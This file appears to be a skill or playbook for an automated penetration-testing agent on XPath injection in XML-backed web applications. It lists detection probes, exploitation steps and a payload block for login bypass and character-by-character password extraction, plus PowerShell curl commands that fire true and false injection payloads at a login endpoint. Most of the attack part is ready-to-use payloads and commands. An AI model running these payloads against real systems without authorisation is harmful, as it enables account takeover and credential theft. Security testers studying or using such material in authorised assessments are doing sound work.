---
name: xpath-injection
description: XPath injection in XML backends — boolean blind, union-style node extraction, and auth bypass when XML data is queried with user input. Use when the app processes XML (RSS, config upload, SOAP) and you control a value used in an XPath query.
category: injection
---

# XPath Injection

## Detection
- App takes XML input or queries XML docs (sitemaps, RSS readers, config files, SOAP services).
- Probe `'` in a queried field → error mentioning XPath/`Invalid expression`/parser detail.

## Exploitation
1. **Auth bypass**: `user=' or 1=1 or ''=''` on login against XML user store.
2. **Boolean blind**: `' or string-length(password)>0 and ''='` — response differs true/false.
3. **Node extraction (boolean subqueries)**: extract `//user[1]/password` char-by-char:
   `' or substring(//user[1]/password,1,1)='a' and ''='`
4. **Counts**: `string-length(//user[1]/password)` to bound extraction.
5. **CWE-643**: no sanitization of `//` or `count()` operators — probe `count(//*)`.

## Payloads
```
admin' or '1'='1
' or 1=1 or ''='
' or count(//user)>0 and ''='
' or substring(//user[1]/password,1,1)='a' and ''='
```

## Tool Commands (Windows)
```powershell
# blind boolean probe (true vs false query)
$trueResp = curl.exe -s -X POST "$U/login" -d "user=admin' or '1'='1&pass=x"
$falseResp = curl.exe -s -X POST "$U/login" -d "user=admin' or '1'='2&pass=x"
# compare responses
if ($trueResp -ne $falseResp) { Write-Host "Potential XPath injection" }
```

## Verification & Evidence
- Distinct true/false response delta, or successful login without valid creds.
- Save both probe responses to evidence.